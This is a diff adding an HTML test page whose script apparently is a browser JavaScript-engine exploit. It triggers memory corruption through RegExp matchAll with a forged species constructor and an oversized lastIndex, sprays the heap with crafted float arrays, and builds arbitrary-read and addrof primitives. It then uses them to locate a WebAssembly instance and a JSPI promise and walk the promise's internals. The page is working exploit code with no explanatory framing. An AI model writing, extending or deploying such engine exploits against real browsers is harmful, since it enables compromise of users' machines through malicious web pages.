@@ -1,0 +1,88 @@
+<!doctype html><html><head><meta charset="utf-8"><title>P59</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+const cvt=new ArrayBuffer(8);const f64=new Float64Array(cvt);
+const u64=new BigUint64Array(cvt);const u32=new Uint32Array(cvt);
+function i2f(i){u64[0]=BigInt.asUintN(64,BigInt(i));return f64[0];}
+function f2i(f){f64[0]=f;return u64[0];}
+function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
+function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
+const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe,PIN=0x1080011;
+const marker={mmm:1},marker2={zzz:2};
+const objB=new Array(0x8000);
+for(var i=0;i<objB.length;i++)objB[i]=marker;
+const wasmBytes=new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11]);
+const wasmI=new WebAssembly.Instance(new WebAssembly.Module(wasmBytes));
+// Create JSPI suspended computation
+let suspendResolve;
+const suspendPromise=new Promise(r=>{suspendResolve=r;});
+const suspendFn=new WebAssembly.Suspending(()=>suspendPromise);
+const moduleB=new WebAssembly.Module(new Uint8Array([
+  0,97,115,109,1,0,0,0,1,8,2,96,0,1,127,96,0,0,
+  2,7,1,1,109,1,115,0,1,3,2,1,0,7,5,1,1,102,0,1,
+  10,8,1,6,0,16,0,26,65,1,11
+]));
+const instanceB=new WebAssembly.Instance(moduleB,{m:{s:suspendFn}});
+const outerPromise=WebAssembly.promising(instanceB.exports.f)();
+objB[4]=wasmI;
+objB[6]=outerPromise; // Store Promise for addrof
+const re=/(?:)/;
+const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
+const c0=w2f(DMAP,EMPTY);
+const sk=[];
+log("UA: "+navigator.userAgent);
+log("JSPI: "+(typeof WebAssembly.Suspending)+"/"+typeof WebAssembly.promising);
+trash(230);trash(230);
+objB[4]=wasmI;objB[5]=marker;objB[6]=outerPromise;objB[7]=marker;
+RegExp.prototype[Symbol.matchAll].call(fk,"").next();
+log("TRIG: "+re.lastIndex);
+trash(230);trash(230);
+for(let r=0;r<3;r++){const c1=w2f(PIN,MAXS);for(let i=0;i<12;i++){const a=new Array(i&1?0x3ffb:0x3fff).fill(c0);for(let j=1;j<a.length;j+=2)a[j]=c1;sk.push(a);}}
+try{
+const m=re.lastIndex;
+log("T: "+typeof m+" A="+Array.isArray(m));
+if(Array.isArray(m)){
+  log("L: "+m.length);
+  function hr(addr){const off=addr-0x1080018;if(off<0||off>0x3FFFFFFE0)return 0n;try{return f2i(m[Math.floor(off/8)]);}catch(e){return 0n;}}
+  // Find LIVE objB
+  const cands=[];
+  for(let k=0x8000;k<0x10010;k++){
+    try{const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+      if(lo===hi&&(lo&1n)===1n&&lo>0x100000n){if(f2i(m[k+1])===v){const v3=f2i(m[k+2]);const w=v3&0xffffffffn;if(w!==lo&&(w&1n)===1n&&w>0x100n){cands.push(k);}}}}catch(e){break;}
+    if(cands.length>=6)break;
+  }
+  let OB=-1;
+  for(const k of cands){const b=f2i(m[k+2]);objB[4]=marker2;const a=f2i(m[k+2]);objB[4]=marker;if(a!==b){OB=k;break;}}
+  if(OB>=0){
+    log("OB:"+OB.toString(16));
+    // addrof wasmI and outerPromise
+    objB[4]=wasmI;const wAddr=Number(f2i(m[OB+2])&0xffffffffn);objB[4]=marker;
+    log("W:"+wAddr.toString(16));
+    objB[6]=outerPromise;const pAddr=Number(f2i(m[OB+3])&0xffffffffn);objB[6]=marker;
+    log("P:"+pAddr.toString(16));
+    // Walk Promise reaction chain
+    // Promise layout: map, properties, reactions_or_result, flags, ...
+    // reactions_or_result is at offset 12 (3rd compressed field)
+    const pRaw=pAddr&0xFFFFFFFE;
+    const pf=[];for(let i=0;i<6;i++)pf.push(hr(pRaw+i*8).toString(16));
+    log("PF:"+pf.join(","));
+    // Extract reaction list pointer (at Promise offset 8 or 12)
+    const pq0=hr(pRaw);const pq1=hr(pRaw+8);const pq2=hr(pRaw+16);
+    log("PQ:"+pq0.toString(16)+","+pq1.toString(16)+","+pq2.toString(16));
+    // Look for non-Empty, non-zero tagged pointers in Promise fields
+    const pPtrs=[];
+    for(let off=0;off<48;off+=4){
+      const v=hr(pRaw+(off&~7));
+      const half=(off%8<4)?Number(v&0xffffffffn):Number(v>>32n);
+      if(half>0x100000&&(half&1)){pPtrs.push(off.toString(16)+":"+half.toString(16));}
+    }
+    log("PP:"+pPtrs.slice(0,6).join(","));
+  }else{log("STALE");}
+  log("W: "+wasmI.exports.f());
+}else{log("NA");}
+}catch(e){log("E: "+e.message);}
+log("=== DONE ===");
+</script></body></html>
